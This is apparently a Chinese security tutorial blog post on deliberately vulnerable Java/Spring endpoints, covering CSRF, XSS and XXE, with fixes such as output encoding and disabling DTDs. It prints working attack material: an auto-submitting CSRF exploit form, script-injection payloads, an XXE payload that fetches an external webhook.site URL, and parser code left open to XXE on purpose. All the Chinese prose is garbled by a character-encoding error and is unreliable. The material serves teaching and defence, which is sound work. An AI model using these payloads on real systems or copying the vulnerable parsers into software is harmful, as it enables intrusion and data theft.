<p>ç®€å•çš„è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±ä»¥å‰è®¤è¯è¿‡çš„ç«™ç‚¹å¹¶è¿è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œï¼ˆå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ï¼‰ã€‚å› ä¸ºæµè§ˆå™¨ä¹‹å‰è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç«™ç‚¹ä¼šè§‰å¾—è¿™æ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œã€‚</p>
<p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p>
<ol>
<li>ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­ç™»å½•äº†å—ä¿¡ä»»çš„ç½‘ç«™ï¼ˆå¦‚é“¶è¡Œç½‘ç«™ï¼‰ï¼Œå¹¶ä¸”æ‹¥æœ‰æœ‰æ•ˆçš„ä¼šè¯ã€‚</li>
<li>æ”»å‡»è€…åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼ŒåµŒå…¥äº†å‘å—ä¿¡ä»»ç½‘ç«™å‘é€è¯·æ±‚çš„ä»£ç ã€‚</li>
<li>ç”¨æˆ·åœ¨ç™»å½•å—ä¿¡ä»»ç½‘ç«™åï¼Œè®¿é—®äº†æ”»å‡»è€…çš„æ¶æ„ç½‘ç«™ï¼Œæ¶æ„ç½‘ç«™åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨å‘å—ä¿¡ä»»ç½‘ç«™å‘é€è¯·æ±‚ï¼ˆå¦‚è½¬è´¦è¯·æ±‚ï¼‰ã€‚</li>
<li>å—ä¿¡ä»»çš„ç½‘ç«™æ— æ³•åŒºåˆ†è¯¥è¯·æ±‚æ˜¯ç”¨æˆ·å‘èµ·çš„è¿˜æ˜¯æ”»å‡»è€…ä¼ªé€ çš„ï¼Œå› æ­¤ä¼šæ‰§è¡Œè¿™ä¸ªè¯·æ±‚</li>
</ol>
<h4 id="1-csrf-post"><a href="#1-csrf-post" class="headerlink" title="1.&#x2F;csrf&#x2F;post"></a>1.&#x2F;csrf&#x2F;post</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="line">public class CSRF &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;/&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;form&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/post&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String post() &#123;</span><br><span class="line">        return &quot;CSRF passed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹å‰ç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script th:src=&quot;@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;</span><br><span class="line">    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@&#123;/csrf/post&#125;&quot; method=&quot;post&quot;&gt; --&gt;</span><br><span class="line">    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; th:name=&quot;$&#123;_csrf.parameterName&#125;&quot; th:value=&quot;$&#123;_csrf.token&#125;&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯¥ä»£ç å­˜åœ¨csrfæ¼æ´ï¼Œæ¼æ´éªŒè¯pocï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF Exploit&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // è‡ªåŠ¨æäº¤è¡¨å•ï¼Œæ‰§è¡Œæ”»å‡»</span><br><span class="line">        document.getElementById(&#x27;csrfForm&#x27;).submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="csrfçš„é˜²æŠ¤"><a href="#csrfçš„é˜²æŠ¤" class="headerlink" title="csrfçš„é˜²æŠ¤"></a>csrfçš„é˜²æŠ¤</h4><ol>
<li>ä½¿ç”¨CSRF Token</li>
</ol>
<p>åœ¨æ¯ä¸ªè¡¨å•æˆ–è¯·æ±‚ä¸­ï¼ŒåŠ å…¥ä¸€ä¸ªéšæœºç”Ÿæˆçš„tokenï¼Œå¹¶å°†å…¶ä¸æœåŠ¡å™¨ç«¯çš„tokenè¿›è¡Œå¯¹æ¯”ã€‚è¿™ä¸ªtokené€šå¸¸å­˜å‚¨åœ¨ç”¨æˆ·çš„sessionä¸­ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶éƒ½è¦æºå¸¦è¿™ä¸ªtokenï¼Œé˜²æ­¢å¤–éƒ¨ç½‘ç«™ä¼ªé€ è¯·æ±‚ã€‚</p>
<ul>
<li>åœ¨HTMLè¡¨å•ä¸­åŠ å…¥ä¸€ä¸ªéšè—çš„inputå­—æ®µæ¥ä¼ é€’CSRF tokenã€‚</li>
<li>åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚ä¸­çš„tokenæ˜¯å¦ä¸å­˜å‚¨çš„ä¸€è‡´ã€‚</li>
</ul>
<ol start="2">
<li>Referer Header æ£€æŸ¥</li>
</ol>
<p>æ£€æŸ¥è¯·æ±‚ä¸­çš„<code>Referer</code> headerï¼Œç¡®ä¿è¯·æ±‚æ¥æºæ˜¯åˆæ³•çš„ç«™ç‚¹ã€‚å°½ç®¡è¿™ä¸€æ–¹æ³•å¹¶ä¸å®Œå…¨å¯é ï¼Œå› ä¸ºæœ‰äº›æµè§ˆå™¨å¯èƒ½ä¼šé™åˆ¶æˆ–ä¸å‘é€<code>Referer</code>ï¼Œä½†å®ƒå¯ä»¥ä½œä¸ºé¢å¤–çš„å®‰å…¨æªæ–½ã€‚</p>
<ol start="3">
<li>SameSite Cookie å±æ€§</li>
</ol>
<p>ä½¿ç”¨<code>SameSite</code>å±æ€§è®¾ç½®cookiesï¼Œé™åˆ¶è·¨ç«™è¯·æ±‚æ—¶æ˜¯å¦å¯ä»¥å‘é€cookieã€‚<code>SameSite</code>æœ‰ä¸‰ä¸ªå€¼ï¼š</p>
<ul>
<li><code>Strict</code>ï¼šå®Œå…¨ç¦æ­¢è·¨ç«™è¯·æ±‚æºå¸¦cookieã€‚</li>
<li><code>Lax</code>ï¼šåªæœ‰éƒ¨åˆ†è·¨ç«™è¯·æ±‚æ‰æºå¸¦cookieï¼ˆä¾‹å¦‚ä»å¤–éƒ¨é“¾æ¥è®¿é—®ç«™ç‚¹æ—¶ï¼‰ã€‚</li>
<li><code>None</code>ï¼šå…è®¸è·¨ç«™è¯·æ±‚æºå¸¦cookieï¼Œä½†å¿…é¡»è®¾ç½®<code>Secure</code>ï¼Œå³è¯·æ±‚éœ€è¦ä½¿ç”¨HTTPSã€‚</li>
</ul>
<ol start="4">
<li>HTTP æ–¹æ³•é™åˆ¶</li>
</ol>
<p>å¯¹äºæ•æ„Ÿæ“ä½œï¼Œå°½é‡ä½¿ç”¨<code>POST</code>ã€<code>PUT</code>ã€<code>DELETE</code>ç­‰éGETæ–¹æ³•ï¼Œå› ä¸ºGETè¯·æ±‚ä¸€èˆ¬ä¸å¸¦æœ‰è¯·æ±‚ä½“ï¼Œå®¹æ˜“è¢«CSRFåˆ©ç”¨ã€‚å¹¶ä¸”å¯ä»¥é€šè¿‡åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚æ–¹æ³•æ˜¯å¦ç¬¦åˆè§„èŒƒæ¥å¢åŠ å®‰å…¨æ€§ã€‚</p>
<ol start="5">
<li>éªŒè¯ç ï¼ˆCAPTCHAï¼‰</li>
</ol>
<p>åœ¨æ‰§è¡Œé‡è¦æ“ä½œï¼ˆå¦‚æäº¤è¡¨å•æˆ–ä¿®æ”¹æ•æ„Ÿä¿¡æ¯ï¼‰æ—¶ï¼ŒåŠ å…¥éªŒè¯ç éªŒè¯ï¼Œç¡®ä¿æ“ä½œæ˜¯ç”±çœŸå®ç”¨æˆ·æ‰§è¡Œï¼Œè€Œä¸æ˜¯è‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p>
<ol start="6">
<li>åŒé‡èº«ä»½éªŒè¯ï¼ˆ2FAï¼‰</li>
</ol>
<p>ç»“åˆèº«ä»½éªŒè¯æªæ–½ï¼Œå¦‚çŸ­ä¿¡éªŒè¯ç æˆ–åº”ç”¨ç”Ÿæˆçš„äºŒæ¬¡å¯†ç ï¼Œåœ¨ç”¨æˆ·æ‰§è¡Œæ•æ„Ÿæ“ä½œæ—¶è¿›ä¸€æ­¥ç¡®è®¤å…¶èº«ä»½ã€‚</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-xss-reflect"><a href="#1-xss-reflect" class="headerlink" title="1.&#x2F;xss&#x2F;reflect"></a>1.&#x2F;xss&#x2F;reflect</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åå°„å‹xss</p>
<p>åˆ©ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png" alt="image-20250725164023603" loading="lazy"></p>
<h4 id="2-xss-stored"><a href="#2-xss-stored" class="headerlink" title="2.&#x2F;xss&#x2F;stored"></a>2.&#x2F;xss&#x2F;stored</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">       Cookie cookie = new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">       response.addCookie(cookie);</span><br><span class="line">       return &quot;Set param into cookie&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line">    * Vul Code.</span><br><span class="line">    * StoredXSS Step2</span><br><span class="line">    * http://localhost:8080/xss/stored/show</span><br><span class="line">    *</span><br><span class="line">    * @param xss unescape string</span><br><span class="line">    */</span><br><span class="line">   @RequestMapping(&quot;/stored/show&quot;)</span><br><span class="line">   @ResponseBody</span><br><span class="line">   public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">       return xss;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å­˜å‚¨å‹xssï¼Œæˆ‘ä»¬å…ˆåœ¨&#x2F;stored&#x2F;storeè·¯ç”±å­˜å…¥Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png" alt="image-20250725164345723" loading="lazy"></p>
<p>ç„¶ååœ¨&#x2F;stored&#x2F;showè·¯ç”±æ”»å‡»</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png" alt="image-20250725164425228" loading="lazy"></p>
<h4 id="xssé˜²æŠ¤"><a href="#xssé˜²æŠ¤" class="headerlink" title="xssé˜²æŠ¤"></a>xssé˜²æŠ¤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> /**</span><br><span class="line">     * safe Code.</span><br><span class="line">     * http://localhost:8080/xss/safe</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/safe&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public static String safe(String xss) &#123;</span><br><span class="line">        return encode(xss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String encode(String origin) &#123;</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;&#x27;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);</span><br><span class="line">        return origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŠŠéœ€è¦çš„å­—ç¬¦éƒ½è¿‡æ»¤äº†åŸºæœ¬å°±é˜²å®Œäº†xssæ”»å‡»</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-xxe-xmlReader-vuln"><a href="#1-xxe-xmlReader-vuln" class="headerlink" title="1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));  <span class="comment">// parse xml</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xmlReader xxe vuln code&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        <span class="keyword">return</span> EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-xxe-SAXBuilder-vuln"><a href="#2-xxe-SAXBuilder-vuln" class="headerlink" title="2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln"></a>2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXBuilderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXBuilder builder = new SAXBuilder();</span><br><span class="line">            // org.jdom2.Document document</span><br><span class="line">            builder.build(new InputSource(new StringReader(body)));  // cause xxe</span><br><span class="line">            return &quot;SAXBuilder xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ¢ç”¨SAXReaderç¬¬ä¸‰æ–¹åº“ï¼Œæ”»å‡»æ‰‹æ³•åŒä¸Šï¼ˆæ³¨æ„è¯·æ±‚è¦ä»¥httpæ ¼å¼è¿›è¡Œè§£æï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png" alt="image-20250725171230237" loading="lazy"></p>
<h4 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç "></a>ä¿®å¤ä»£ç </h4><p>é€šè¿‡<code>setFeature</code>å…³é—­DTDå’Œå¤–éƒ¨å®ä½“è§£æä»è€Œé˜²æ­¢äº†xxe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="line">public String xmlReaderSec(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body = WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line"></span><br><span class="line">        XMLReader xmlReader = XMLReaderFactory.createXMLReader();</span><br><span class="line">        // fix code start</span><br><span class="line">        xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">        xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">        //fix code end</span><br><span class="line">        xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;xmlReader xxe security code&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-xxe-SAXReader-vuln"><a href="#3-xxe-SAXReader-vuln" class="headerlink" title="3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln"></a>3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String SAXReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = new SAXReader();</span><br><span class="line">            // org.dom4j.Document document</span><br><span class="line">            reader.read(new InputSource(new StringReader(body))); // cause xxe</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;SAXReader xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å’Œå‰ä¸¤ä¸ªçš„payloadä¸€æ ·ä½†åŒºåˆ«æ˜¯è¿™ä¸ªæœ‰å›æ˜¾</p>
<h4 id="4-xxe-SAXParser-vuln"><a href="#4-xxe-SAXParser-vuln" class="headerlink" title="4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln"></a>4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">  public String SAXParserVuln(HttpServletRequest request) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">          String body = WebUtils.getRequestBody(request);</span><br><span class="line">          logger.info(body);</span><br><span class="line"></span><br><span class="line">          SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">          SAXParser parser = spf.newSAXParser();</span><br><span class="line">          parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml</span><br><span class="line"></span><br><span class="line">          return &quot;SAXParser xxe vuln code&quot;;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          logger.error(e.toString());</span><br><span class="line">          return EXCEPT;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-xxe-Digester-vuln"><a href="#5-xxe-Digester-vuln" class="headerlink" title="5.&#x2F;xxe&#x2F;Digester&#x2F;vuln"></a>5.&#x2F;xxe&#x2F;Digester&#x2F;vuln</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String DigesterVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = new Digester();</span><br><span class="line">            digester.parse(new StringReader(body));  // parse xml</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Digester xxe vuln code&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

